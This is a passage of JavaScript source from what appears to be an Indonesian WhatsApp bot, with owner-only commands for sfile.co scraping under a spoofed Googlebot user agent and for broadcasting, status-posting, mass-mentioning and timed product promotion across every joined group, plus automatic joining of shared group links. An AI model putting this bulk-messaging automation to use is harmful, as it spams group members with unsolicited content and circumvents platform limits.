        return NXL.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    }
}
break

case 'sfile': {
  if (!text) return m.reply(`Contoh: ${prefix + command} https://sfile.co/xxxxxx`)

  if (!text.includes('sfile.co') && !text.includes('sfile.mobi')) {
    return m.reply('Link harus dari sfile.co atau sfile.mobi!')
  }

  m.reply(mess.wait)

  try {
    const pageRes = await fetch(text, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Referer': text
      }
    })
    const html = await pageRes.text()
    const $ = cheerio.load(html)

    const title = $('title').text().trim()
    const desc = $('meta[name="description"]').attr('content') || ''
    const size = desc.match(/size\s+([\d.]+ \w+)/i)?.[1] || '-'
    const uploader = $('a[href*="/user/"]').first().text().trim() || '-'
    const uploaded = desc.match(/on\s+(\d+ \w+ \d+)/i)?.[1] || '-'
    const downloads = $('p, span, div').filter((_, el) => $(el).text().includes('Downloads')).first().text().match(/[\d,]+/)?.[0] || '-'
    const mimetype = $('p').filter((_, el) => $(el).text().includes('/')).first().text().trim() || '-'
    const fileId = text.split('/').pop().split('?')[0]
    const category = $('a[href*="/category/"]').first().text().trim() || '-'

    m.reply(
      `*Sfile Info*\n\n` +
      `Nama: ${title}\n` +
      `Ukuran: ${size}\n` +
      `Tipe: ${mimetype}\n` +
      `Kategori: ${category}\n` +
      `Upload oleh: ${uploader}\n` +
      `Tanggal: ${uploaded}\n` +
      `Downloads: ${downloads}\n` +
      `File ID: ${fileId}\n\n` +
      `Link: ${text}`
    )

  } catch (err) {
    m.reply(`Gagal: ${err.message}`)
  }
}
break

case 'swgc': case 'upswgc': {
  if (!isCreator) return reply(mess.owner)
  const { fromBuffer } = require("file-type");
  const fs = require("fs");
  const path = require("path");

  let content = {}
  let buffer, ext, tempFile

  if (m.quoted) {
    try {
      buffer = await m.quoted.download()
      if (!buffer) return m.reply("❌ Gagal mengambil media quoted.")
      ext = (await fromBuffer(buffer))?.ext || 'bin'
      tempFile = path.join(__dirname, `tmp_${Date.now()}.${ext}`)
      fs.writeFileSync(tempFile, buffer)

      const quotedType = m.quoted.mtype || Object.keys(m.quoted.message || {})[0] || ''
      if (/image|video|audio/.test(quotedType)) {
        if (/image/.test(quotedType)) {
          content.image = { url: tempFile }
          if (text) content.caption = text
        } else if (/video/.test(quotedType)) {
          content.video = { url: tempFile }
          if (text) content.caption = text
        } else if (/audio/.test(quotedType)) {
          if (text) {
            fs.unlinkSync(tempFile)
            return m.reply("Audio tidak boleh disertai caption.")
          }
          content.audio = { url: tempFile }
          content.ptt = false
        }
      } else {
        fs.unlinkSync(tempFile)
        return m.reply("Reply harus berupa image/video/audio.")
      }
    } catch (e) {
      return m.reply("❌ Media tidak valid atau gagal diproses.")
    }
  } else if (text) {
    content.text = text
  } else {
    return m.reply("Kirim media (foto/video/audio) atau teks, bisa dengan reply atau langsung.")
  }

  if (content.text && !content.text.trim()) return m.reply("Teks tidak boleh kosong.")

  let allGroups = await NXL.groupFetchAllParticipating()
  let validGroups = []

  for (let [gid, metadata] of Object.entries(allGroups)) {
    validGroups.push({
      title: metadata.subject || gid,
      description: gid,
      id: `.sendstatus ${gid} ${encodeURIComponent(JSON.stringify(content))}`
    })
  }

  if (!validGroups.length) {
    if (tempFile && fs.existsSync(tempFile)) fs.unlinkSync(tempFile)
    return m.reply("Tidak ada grup valid yang bisa dipilih.")
  }

  const encodedAll = encodeURIComponent(JSON.stringify(content))
  const allGids = Object.keys(allGroups).join(',')

  const chunkSize = 10
  const sections = []
  for (let i = 0; i < validGroups.length; i += chunkSize) {
    sections.push({
      title: `Grup ${i + 1}–${Math.min(i + chunkSize, validGroups.length)}`,
      rows: validGroups.slice(i, i + chunkSize)
    })
  }

  let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
        interactiveMessage: {
          body: { text: `\`\`\`Pilih Grup Tujuan ♨️\`\`\`\n\nTotal grup: *${validGroups.length}*` },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "PILIH GRUP",
                  sections: sections
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: `📢 Kirim ke Semua Grup (${validGroups.length})`,
                  id: `.sendstatus ALL ${encodedAll}`
                })
              }
            ]
          }
        }
      }
    }
  }, { quoted: m }, {})

  await NXL.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id
  })
}
break

case 'sendstatus': {
  if (!isCreator) return reply(mess.owner)
  const fs = require("fs")
  const [groupId, ...contentARR] = args
  if (!groupId || !contentARR.length) return m.reply("❌ Format tidak valid.")

  let contentDecoded
  try {
    contentDecoded = JSON.parse(decodeURIComponent(contentARR.join(' ')))
  } catch (e) {
    return m.reply("❌ Gagal decode konten.")
  }

  if (groupId === 'ALL') {
    let allGroups = await NXL.groupFetchAllParticipating()
    let groupIds = Object.keys(allGroups)
    await m.reply(`📢 Mengirim ke *${groupIds.length}* grup...`)
    let sukses = 0, gagal = 0
    for (let gid of groupIds) {
      try {
        await groupStatus(gid, { ...contentDecoded })
        sukses++
        await new Promise(r => setTimeout(r, 1500))
      } catch {
        gagal++
      }
    }
    for (let key of ['image', 'video', 'audio']) {
      let filePath = contentDecoded?.[key]?.url
      if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath)
    }
    return m.reply(`✅ Selesai!\n📤 Sukses: *${sukses}* | ❌ Gagal: *${gagal}*`)
  }

  let sent = await groupStatus(groupId, contentDecoded)

  for (let key of ['image', 'video', 'audio']) {
    let filePath = contentDecoded?.[key]?.url
    if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath)
  }

  m.reply(sent
    ? `✅ Berhasil dikirim ke grup: ${groupId}`
    : `❌ Gagal kirim ke grup: ${groupId}`
  )
}
break
case 'setautoswgc': {
  if (!isCreator) return reply(mess.owner)
  const fs = require("fs")
  const { fromBuffer } = require("file-type")
  const path = require("path")

  if (args[0] && !isNaN(parseInt(args[0])) && !m.quoted && !text.replace(args[0], '').trim()) {
    const jeda = parseInt(args[0])
    if (jeda < 1000) return m.reply("Minimal jeda 1000ms (1 detik).")
    global.JedaSwgc = jeda
    return m.reply(`✅ Jeda autoswgc diset ke *${jeda}ms*`)
  }

  let content = {}
  let buffer, ext, tempFile

  if (m.quoted) {
    try {
      buffer = await m.quoted.download()
      if (!buffer) return m.reply("❌ Gagal mengambil media quoted.")
      ext = (await fromBuffer(buffer))?.ext || 'bin'
      tempFile = path.join(__dirname, `tmp_swgc_set_${Date.now()}.${ext}`)
      fs.writeFileSync(tempFile, buffer)

      const quotedType = m.quoted.mtype || Object.keys(m.quoted.message || {})[0] || ''
      if (/image/.test(quotedType)) {
        content.image = { url: tempFile }
        if (text) content.caption = text
      } else if (/video/.test(quotedType)) {
        content.video = { url: tempFile }
        if (text) content.caption = text
      } else if (/audio/.test(quotedType)) {
        if (text) {
          fs.unlinkSync(tempFile)
          return m.reply("Audio tidak boleh disertai caption.")
        }
        content.audio = { url: tempFile }
        content.ptt = false
      } else {
        fs.unlinkSync(tempFile)
        return m.reply("Reply harus berupa image/video/audio.")
      }
    } catch (e) {
      return m.reply("❌ Media tidak valid atau gagal diproses.")
    }
  } else if (text) {
    content.text = text
  } else {
    return m.reply([
      `*Penggunaan .setautoswgc:*`,
      `• Set jeda: .setautoswgc 5000`,
      `• Set konten teks: .setautoswgc teks pesan`,
      `• Set konten media: reply foto/video lalu .setautoswgc`,
      `• Set media + caption: reply foto lalu .setautoswgc caption`,
      `\n📦 Konten tersimpan: ${global.autoSwgcContent ? '✅ Ada' : '❌ Belum diset'}`,
      `⏱ Jeda: ${global.JedaSwgc}ms`
    ].join('\n'))
  }

  global.autoSwgcContent = content
  m.reply(`✅ Konten autoswgc berhasil disimpan!\n⏱ Jeda aktif: *${global.JedaSwgc}ms*\n\nJalankan dengan *.autojpmswgc*`)
}
break

case 'autojpmswgc': {
  if (!isCreator) return reply(mess.owner)
  const fs = require("fs")

  if (!global.autoSwgcContent) {
    return m.reply("❌ Konten belum diset!\nGunakan *.setautoswgc* dulu untuk menyimpan konten.")
  }

  const content = global.autoSwgcContent
  const jeda = global.JedaSwgc || 5000
  global.stopswgc = false

  let allGroups
  try {
    allGroups = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    global.stopswgc = false
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  const blacklist = loadBlacklistSwgc()
  const groupIds = Object.keys(allGroups).filter(gid => !blacklist.includes(gid))

  if (!groupIds.length) return m.reply("❌ Tidak ada grup valid.")

  await m.reply(`🚀 Mulai autojpmswgc ke *${groupIds.length}* grup\n⏱ Jeda: *${jeda}ms* per grup\n\nKirim *.stopswgc* untuk menghentikan.`)

  let sukses = 0, gagal = 0, index = 0

  for (let gid of groupIds) {
    if (global.stopswgc) break
    index++
    try {
      await groupStatus(gid, { ...content })
      sukses++
    } catch {
      gagal++
    }
    if (index < groupIds.length && !global.stopswgc) {
      await new Promise(r => setTimeout(r, jeda))
    }
  }

  const stopped = global.stopswgc
  global.stopswgc = false

  // Cleanup: hapus file temp dari setautoswgc jika ada (aman jika file sudah tidak ada)
  try {
    for (const key of ['image', 'video', 'audio']) {
      const filePath = content?.[key]?.url
      if (filePath && fs.existsSync(filePath)) fs.unlinkSync(filePath)
    }
  } catch {}

  m.reply(`${stopped ? '⛔ Dihentikan!' : '✅ Selesai!'}\n📤 Sukses: *${sukses}*\n❌ Gagal: *${gagal}*\n📊 Total: *${index}/${groupIds.length}*`
  )
}
break

case 'stopswgc': {
  if (!isCreator) return reply(mess.owner)
  global.stopswgc = true
  m.reply("⛔ Menghentikan autojpmswgc...")
}
break

case 'jedapush': {
  if (!isCreator) return reply(mess.owner)
  if (!text || isNaN(parseInt(text))) return m.reply(`*Contoh :* .jedapush 5000\n\nJeda saat ini: *${global.JedaPushkontak}ms*`)
  const jeda = parseInt(text)
  if (jeda < 1000) return m.reply("Minimal jeda 1000ms (1 detik).")
  global.JedaPushkontak = jeda
  m.reply(`✅ Jeda push kontak diset ke *${jeda}ms*`)
}
break

case 'jedajpm': {
  if (!isCreator) return reply(mess.owner)
  if (!text || isNaN(parseInt(text))) return m.reply(`*Contoh :* .jedajpm 4000\n\nJeda saat ini: *${global.JedaJpm}ms*`)
  const jeda = parseInt(text)
  if (jeda < 1000) return m.reply("Minimal jeda 1000ms (1 detik).")
  global.JedaJpm = jeda
  m.reply(`✅ Jeda JPM diset ke *${jeda}ms*`)
}
break

case 'listgrup':
case 'listgroup': {
  if (!isCreator) return reply(mess.owner)
  try {
    const allGroups = await NXL.groupFetchAllParticipating()
    const entries = Object.entries(allGroups)
    if (!entries.length) return m.reply("Bot tidak terdaftar di grup manapun.")
    let teks = `*Daftar Grup Bot*\n${"─".repeat(25)}\n`
    entries.forEach(([id, meta], i) => {
      teks += `${i + 1}. *${meta.subject || id}*\n   └ ${id}\n   └ Member: ${meta.participants?.length || 0}\n`
    })
    teks += `\nTotal: *${entries.length}* grup`
    m.reply(teks)
  } catch (e) {
    m.reply("Gagal mengambil daftar grup: " + e.message)
  }
}
break

case 'setjpm': {
  if (!isCreator) return reply(mess.owner)

  if (!text && !m.quoted) return m.reply(
    `*Penggunaan .setjpm:*\n` +
    `• Set teks: .setjpm teks pesan\n` +
    `• Set foto+caption: reply foto lalu .setjpm caption\n` +
    `• Set foto saja: reply foto lalu .setjpm\n\n` +
    `📦 Konten tersimpan: ${global.jpmContent ? '✅ Ada' : '❌ Belum diset'}\n` +
    `⏱ Jeda: ${global.JedaJpm}ms`
  )

  let content = {}
  if (m.quoted && /image/.test(mime)) {
    try {
      const mediaPath = await NXL.downloadAndSaveMediaMessage(qmsg)
      content.image = fs.readFileSync(mediaPath)
      if (text) content.caption = text
      fs.unlinkSync(mediaPath)
    } catch (e) {
      return m.reply("❌ Gagal mengambil media: " + e.message)
    }
  } else if (text) {
    content.text = text
  } else {
    return m.reply("Kirim teks atau reply foto untuk menyimpan konten JPM.")
  }

  global.jpmContent = content
  m.reply(`✅ Konten JPM berhasil disimpan!\n⏱ Jeda aktif: *${global.JedaJpm}ms*\n\nJalankan dengan *.autojpm*`)
}
break

case 'autojpm': {
  if (!isCreator) return reply(mess.owner)

  if (!global.jpmContent) {
    return m.reply("❌ Konten belum diset!\nGunakan *.setjpm* dulu untuk menyimpan konten.")
  }

  const jpmC = global.jpmContent
  const jpmJeda = global.JedaJpm || 4000
  global.stopjpm = false

  let allGroupsJpm
  try {
    allGroupsJpm = await global.getGroupsCached()
  } catch (e) {
    global.stopjpm = false
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  let blacklistJpm = []
  try { blacklistJpm = loadBlacklistJpm() } catch { blacklistJpm = [] }
  const blacklistJpmIds = blacklistJpm.map(v => v.id || v)
  const groupIdsJpm = Object.keys(allGroupsJpm).filter(id => !blacklistJpmIds.includes(id))

  if (!groupIdsJpm.length) return m.reply("❌ Tidak ada grup valid.")

  const skippedJpm = Object.keys(allGroupsJpm).length - groupIdsJpm.length
  await m.reply(`🚀 Mulai autojpm ke *${groupIdsJpm.length}* grup\n⏱ Jeda: *${jpmJeda}ms*${skippedJpm > 0 ? `\n⛔ Skip blacklist: *${skippedJpm}* grup` : ''}\n\nKirim *.stopjpm* untuk menghentikan.`)

  let jpmSukses = 0, jpmGagal = 0, jpmIdx = 0

  for (const gid of groupIdsJpm) {
    if (global.stopjpm) break
    jpmIdx++
    try {
      await NXL.sendMessage(gid, jpmC, { quoted: FakeChannel })
      jpmSukses++
    } catch {
      jpmGagal++
    }
    if (jpmIdx < groupIdsJpm.length && !global.stopjpm) {
      await new Promise(r => setTimeout(r, jpmJeda))
    }
  }

  const jpmStopped = global.stopjpm
  global.stopjpm = false
  m.reply(`${jpmStopped ? '⛔ Dihentikan!' : '✅ Selesai!'}\n📤 Sukses: *${jpmSukses}*\n❌ Gagal: *${jpmGagal}*\n📊 Total: *${jpmIdx}/${groupIdsJpm.length}*`)
}
break

case 'stopjpm': {
  if (!isCreator) return reply(mess.owner)
  global.stopjpm = true
  m.reply("⛔ Menghentikan autojpm...")
}
break

case 'jpmswgc': {
  if (!isCreator) return reply(mess.owner)

  if (!text && !m.quoted) return m.reply(
    `*Penggunaan .jpmswgc:*\n` +
    `• Kirim teks: .jpmswgc teks pesan\n` +
    `• Kirim foto+caption: reply foto lalu .jpmswgc caption\n\n` +
    `_Pesan akan dikirim sebagai status grup ke semua grup._`
  )

  let jpmswgcContent = {}
  let jpmswgcTempFile = null

  if (m.quoted && /image|video/.test(mime)) {
    try {
      jpmswgcTempFile = await NXL.downloadAndSaveMediaMessage(qmsg)
      if (/image/.test(mime)) {
        jpmswgcContent.image = { url: jpmswgcTempFile }
      } else {
        jpmswgcContent.video = { url: jpmswgcTempFile }
      }
      if (text) jpmswgcContent.caption = text
    } catch (e) {
      return m.reply("❌ Gagal mengambil media: " + e.message)
    }
  } else if (text) {
    jpmswgcContent.text = text
  } else {
    return m.reply("Kirim teks atau reply media.")
  }

  let allGroupsSwgc
  try {
    allGroupsSwgc = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  const groupIdsSwgc = Object.keys(allGroupsSwgc)

  if (!groupIdsSwgc.length) return m.reply("❌ Tidak ada grup.")

  await m.reply(`🚀 Mengirim JPMSWGC ke *${groupIdsSwgc.length}* grup...`)

  let swgcSukses = 0, swgcGagal = 0

  for (const gid of groupIdsSwgc) {
    try {
      await groupStatus(gid, { ...jpmswgcContent })
      swgcSukses++
    } catch {
      swgcGagal++
    }
    await new Promise(r => setTimeout(r, global.JedaSwgc || 5000))
  }

  if (jpmswgcTempFile && fs.existsSync(jpmswgcTempFile)) fs.unlinkSync(jpmswgcTempFile)
  m.reply(`✅ Selesai!\n📤 Sukses: *${swgcSukses}*\n❌ Gagal: *${swgcGagal}*\n📊 Total: *${groupIdsSwgc.length}*`)
}
break

case 'jaserht': {
  if (!isCreator) return reply(mess.owner)
  if (global.statusjpm) return m.reply(`⚠️ JPM sedang berjalan, tunggu sampai selesai!`)
  if (!text) return m.reply(`*Contoh :* .jaserht pesannya\n\nFitur ini mengirim JPM + tag semua member grup.`)

  let jaserhtPath
  if (/image/.test(mime)) {
    try { jaserhtPath = await NXL.downloadAndSaveMediaMessage(qmsg) } catch {}
  }

  let allGroupsHt
  try {
    allGroupsHt = await Promise.race([
      NXL.groupFetchAllParticipating(),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
    ])
  } catch (e) {
    return m.reply(`❌ Gagal mengambil daftar grup: ${e.message}`)
  }
  let blacklistHt = []
  try { blacklistHt = loadBlacklistJpm() } catch { blacklistHt = [] }
  const blacklistHtIds = blacklistHt.map(v => v.id || v)
  const filteredHt = Object.keys(allGroupsHt).filter(id => !blacklistHtIds.includes(id))
  const skippedHt = Object.keys(allGroupsHt).length - filteredHt.length

  const jenisHt = jaserhtPath ? "teks & foto" : "teks"
  await m.reply(`⏳ Memproses JASERHT ${jenisHt} ke *${filteredHt.length}* grup...\n${skippedHt > 0 ? `⛔ *${skippedHt}* grup di-skip (blacklist)` : ''}`)

  let htSukses = 0, htGagal = 0

  for (const gid of filteredHt) {
    if (global.stopjpm) {
      global.stopjpm = false
      break
    }
    try {
      const members = allGroupsHt[gid]?.participants?.map(e => e.jid || e.id) || []
      const htContent = jaserhtPath
        ? { image: fs.readFileSync(jaserhtPath), caption: text, mentions: members }
        : { text, mentions: members }
      await NXL.sendMessage(gid, htContent, { quoted: FakeChannel })
      htSukses++
    } catch (e) {
      htGagal++
    }
    await new Promise(r => setTimeout(r, global.JedaJpm || 4000))
  }

  if (jaserhtPath && fs.existsSync(jaserhtPath)) fs.unlinkSync(jaserhtPath)
  m.reply(`✅ JASERHT ${jenisHt} selesai!\n📤 Sukses: *${htSukses}/${filteredHt.length}*\n${skippedHt > 0 ? `⛔ Di-skip blacklist: *${skippedHt}*` : ''}`)
}
break

case 'notifgrup': {
  if (!isCreator) return reply(mess.owner)
  if (global.notifGrup === undefined) global.notifGrup = true

  const subCmd = args[0]?.toLowerCase()

  if (subCmd === 'on') {
    if (global.notifGrup === true) return reply(`> [ NXL BOT ]\n\`INFO\`\n*Notif Grup sudah ON*\n<>`)
    global.notifGrup = true
    return reply(`> [ NXL BOT ]\n\`BERHASIL\`\n*Notif Grup dinyalakan*\n_Perubahan grup akan dikirim kembali_\n<>`)
  }

  if (subCmd === 'off') {
    if (global.notifGrup === false) return reply(`> [ NXL BOT ]\n\`INFO\`\n*Notif Grup sudah OFF*\n<>`)
    global.notifGrup = false
    return reply(`> [ NXL BOT ]\n\`BERHASIL\`\n*Notif Grup dimatikan*\n_Bot tidak akan kirim notif perubahan grup_\n<>`)
  }

  // Panel dengan button
  const status = global.notifGrup !== false ? '🟢 ON' : '🔴 OFF'
  try {
    await NXL.relayMessage(m.chat, {
      interactiveMessage: proto.Message.InteractiveMessage.create({
        contextInfo: {
          isForwarded: true,
          forwardedNewsletterMessageInfo: { newsletterJid: global.idsal || '', newsletterName: wm, serverMessageId: -1 }
        },
        body: proto.Message.InteractiveMessage.Body.create({
          text: `╭─「 *🔔 NOTIF GRUP* 」\n│\n│  Status : *${status}*\n│\n│  Notifikasi saat ada yang:\n│  • Ganti nama grup\n│  • Update deskripsi grup\n│  • Reset link grup\n╰─「 *${wm}* 」`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({ text: `© ${wm}` }),
        header: proto.Message.InteractiveMessage.Header.create({ title: `🔔 Notif Grup`, hasMediaAttachment: false }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🟢 ON', id: '.notifgrup on' }) },
            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: '🔴 OFF', id: '.notifgrup off' }) }
          ]
        })
      })
    }, {})
  } catch (e) {
    reply(`> [ NXL BOT ]\n\`NOTIF GRUP\`\n*Status : ${status}*\n\n_Ketik .notifgrup on/off_\n<>`)
  }
}
break

case 'autojoingc': {
  if (!isCreator) return reply(mess.owner)

  // Init state
  if (global.autoJoinGc === undefined) global.autoJoinGc = false
  if (global.autoJoinGcDelay === undefined) global.autoJoinGcDelay = 5000

  const subCmd = args[0]?.toLowerCase()

  // .autojoingc delay <ms>
  if (subCmd === 'delay') {
    const jeda = parseInt(args[1])
    if (isNaN(jeda) || jeda < 1000) return m.reply(`> [ NXL BOT ]\n\`PENGGUNAAN SALAH\`\n*Minimal delay 1000ms*\n*Contoh: .autojoingc delay 5000*\n<>`)
    global.autoJoinGcDelay = jeda
    return m.reply(`> [ NXL BOT ]\n\`BERHASIL\`\n*Delay autojoingc diset ke ${jeda}ms (${jeda/1000} detik)*\n<>`)
  }

  // .autojoingc on/off (text fallback / dari button quick_reply)
  if (subCmd === 'on') {
    if (global.autoJoinGc) return m.reply(`> [ NXL BOT ]\n\`INFO\`\n*AutoJoin GC sudah ON*\n<>`)
    global.autoJoinGc = true
    return m.reply(`> [ NXL BOT ]\n\`BERHASIL\`\n*AutoJoin GC dinyalakan*\n_Bot akan otomatis join saat ada yang kirim link grup_\n_Delay: ${global.autoJoinGcDelay}ms_\n<>`)
  }
  if (subCmd === 'off') {
    if (!global.autoJoinGc) return m.reply(`> [ NXL BOT ]\n\`INFO\`\n*AutoJoin GC sudah OFF*\n<>`)
    global.autoJoinGc = false
    return m.reply(`> [ NXL BOT ]\n\`BERHASIL\`\n*AutoJoin GC dimatikan*\n<>`)
  }

  // Panel utama dengan button
  const statusNow = global.autoJoinGc ? '🟢 ON' : '🔴 OFF'
  try {
    const panelMsg = {
      interactiveMessage: proto.Message.InteractiveMessage.create({
        contextInfo: {
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: global.idsal || '',
            newsletterName: wm,
            serverMessageId: -1
          }
        },
        body: proto.Message.InteractiveMessage.Body.create({
          text: `╭─「 *⚙️ AUTO JOIN GC* 」\n│\n│  Status  : *${statusNow}*\n│  Delay   : *${global.autoJoinGcDelay}ms (${global.autoJoinGcDelay/1000}dtk)*\n│\n│  _Bot otomatis join saat ada yang_\n│  _mengirim link grup WhatsApp_\n│\n│  Ubah delay:\n│  *.autojoingc delay 5000*\n╰─「 *${wm}* 」`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: `© ${wm}`
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          title: `⚙️ Auto Join GC`,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({ display_text: '🟢 ON', id: '.autojoingc on' })
            },
            {
              name: 'quick_reply',
              buttonParamsJson: JSON.stringify({ display_text: '🔴 OFF', id: '.autojoingc off' })
            }
          ]
        })
      })
    }
    await NXL.relayMessage(m.chat, panelMsg, {})
  } catch (e) {
    m.reply(`> [ NXL BOT ]\n\`AUTO JOIN GC\`\n*Status : ${statusNow}*\n*Delay  : ${global.autoJoinGcDelay}ms*\n\n_Ketik .autojoingc on/off_\n_Ubah delay: .autojoingc delay 5000_\n<>`)
  }
}
break

case 'blswgc': {
  if (!isCreator) return reply(mess.owner)
  if (!text) return m.reply(`Contoh: .blswgc 120363xxxxxx@g.us`)
  const list = loadBlacklistSwgc()
  if (list.includes(text)) return m.reply("Grup sudah ada di blacklist.")
  list.push(text)
  saveBlacklistSwgc(list)
  m.reply(`✅ Grup *${text}* ditambahkan ke blacklist swgc.`)
}
break

case 'delblswgc': {
  if (!isCreator) return reply(mess.owner)
  if (!text) return m.reply(`Contoh: .delblswgc 120363xxxxxx@g.us`)
  let list = loadBlacklistSwgc()
  if (!list.includes(text)) return m.reply("Grup tidak ada di blacklist.")
  list = list.filter(v => v !== text)
  saveBlacklistSwgc(list)
  m.reply(`✅ Grup *${text}* dihapus dari blacklist swgc.`)
}
break

case 'listblswgc': {
  if (!isCreator) return reply(mess.owner)
  const list = loadBlacklistSwgc()
  if (!list.length) return m.reply("Blacklist swgc kosong.")
  m.reply(`*Blacklist SWGC:*\n${list.map((v, i) => `${i + 1}. ${v}`).join('\n')}`)
}
break

case "listproduk": {
  const produk = JSON.parse(fs.readFileSync("./database/produk.json"))
  if (produk.length < 1) return m.reply("Belum ada produk.")
  
  let teks = `*Daftar Produk ${ownername}*\n${"─".repeat(25)}\n\n`
  produk.forEach((p, i) => {
    teks += `*${i + 1}. ${p.nama}*\n`
    teks += `💰 Harga : Rp${Number(p.harga).toLocaleString("id-ID")}\n`
    teks += `📦 Stok  : ${p.stok > 0 ? p.stok + " pcs" : "Habis"}\n`
    teks += `📝 Info  : ${p.deskripsi}\n\n`
  })
  teks += `_Total ${produk.length} produk tersedia_`
  
  return m.reply(teks)
}
break

case "addproduk": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(
    `*Format Tambah Produk:*\n` +
    `.addproduk Nama | Harga | Stok | Deskripsi\n\n` +
    `*Contoh:*\n` +
    `.addproduk Script Bot | 50000 | 10 | Script WA bot lengkap`
  )

  const parts = text.split("|").map(s => s.trim())
  if (parts.length < 4) return m.reply("Format salah. Gunakan: Nama | Harga | Stok | Deskripsi")

  const [nama, harga, stok, deskripsi] = parts
  if (isNaN(harga) || isNaN(stok)) return m.reply("Harga dan stok harus angka.")

  let gambar = null
  if (/image/.test(mime)) {
    const mediaPath = await NXL.downloadAndSaveMediaMessage(qmsg)
    gambar = fs.readFileSync(mediaPath).toString("base64")
    fs.unlinkSync(mediaPath)
  }

  const produk = JSON.parse(fs.readFileSync("./database/produk.json"))
  const id = Date.now()
  produk.push({ id, nama, harga: Number(harga), stok: Number(stok), deskripsi, gambar })
  fs.writeFileSync("./database/produk.json", JSON.stringify(produk, null, 2))

  return m.reply(`Produk *${nama}* berhasil ditambahkan!\nID: ${id}`)
}
break

case "delproduk": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply("Masukkan ID atau nomor urut produk.\nContoh: .delproduk 1")

  let produk = JSON.parse(fs.readFileSync("./database/produk.json"))
  if (produk.length < 1) return m.reply("Belum ada produk.")

  let target
  if (!isNaN(text)) {
    const idx = Number(text) - 1
    if (idx < 0 || idx >= produk.length) return m.reply("Nomor produk tidak valid.")
    target = produk[idx]
    produk.splice(idx, 1)
  } else {
    target = produk.find(p => String(p.id) === text.trim())
    if (!target) return m.reply("Produk tidak ditemukan.")
    produk = produk.filter(p => String(p.id) !== text.trim())
  }

  fs.writeFileSync("./database/produk.json", JSON.stringify(produk, null, 2))
  return m.reply(`Produk *${target.nama}* berhasil dihapus.`)
}
break

case "setpromo": {
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(
    `*Format Setpromo:*\n` +
    `.setpromo target | interval\n\n` +
    `*Target:* grup / channel / kontak\n` +
    `*Interval:* dalam menit\n\n` +
    `*Contoh:*\n` +
    `.setpromo grup | 60`
  )

  const parts = text.split("|").map(s => s.trim())
  if (parts.length < 2) return m.reply("Format salah. Gunakan: target | interval (menit)")

  const [target, intervalMenit] = parts
  const validTarget = ["grup", "channel", "kontak"]
  if (!validTarget.includes(target.toLowerCase())) return m.reply(`Target harus: ${validTarget.join(" / ")}`)
  if (isNaN(intervalMenit) || Number(intervalMenit) < 1) return m.reply("Interval minimal 1 menit.")

  let promo = {}
  try { promo = JSON.parse(fs.readFileSync("./database/promo.json")) } catch { promo = { status: false } }
  promo.target = target.toLowerCase()
  promo.interval = Number(intervalMenit) * 60000
  if (!fs.existsSync('./database')) fs.mkdirSync('./database', { recursive: true })
  fs.writeFileSync("./database/promo.json", JSON.stringify(promo, null, 2))

  return m.reply(`✅ Promo diset ke *${target}* setiap *${intervalMenit} menit*.`)
}
break

case "autopromo": {
  if (!isCreator) return m.reply(mess.owner)

  const promo = JSON.parse(fs.readFileSync("./database/promo.json"))
  const produk = JSON.parse(fs.readFileSync("./database/produk.json"))
  if (produk.length < 1) return m.reply("Belum ada produk. Tambahkan dulu dengan .addproduk")

  if (global.intervalPromo) {
    clearInterval(global.intervalPromo)
    delete global.intervalPromo
    promo.status = false
    fs.writeFileSync("./database/promo.json", JSON.stringify(promo, null, 2))
    return m.reply("Autopromo dimatikan.")
  }

  promo.status = true
  fs.writeFileSync("./database/promo.json", JSON.stringify(promo, null, 2))
  await m.reply(`Autopromo dinyalakan!\nTarget: *${promo.target}* | Interval: *${promo.interval / 60000} menit*`)

  const kirimPromo = async () => {
    const dataProduk = JSON.parse(fs.readFileSync("./database/produk.json"))
    if (dataProduk.length < 1) return

    const p = dataProduk[Math.floor(Math.random() * dataProduk.length)]
    const teks = `*PROMO ${ownername}*\n${"─".repeat(20)}\n\n*${p.nama}*\n💰 Harga : Rp${Number(p.harga).toLocaleString("id-ID")}\n📦 Stok  : ${p.stok > 0 ? p.stok + " pcs" : "Habis"}\n📝 Info  : ${p.deskripsi}\n\n_Hubungi owner untuk order!_`

    let targetList = []

    if (promo.target === "grup") {
      try {
        const allGroups = await Promise.race([
          NXL.groupFetchAllParticipating(),
          new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), 20000))
        ])
        targetList = Object.keys(allGroups)
      } catch { targetList = [] }
    } else if (promo.target === "channel") {
      const all = [...(global.store?.chats?.array || [])]
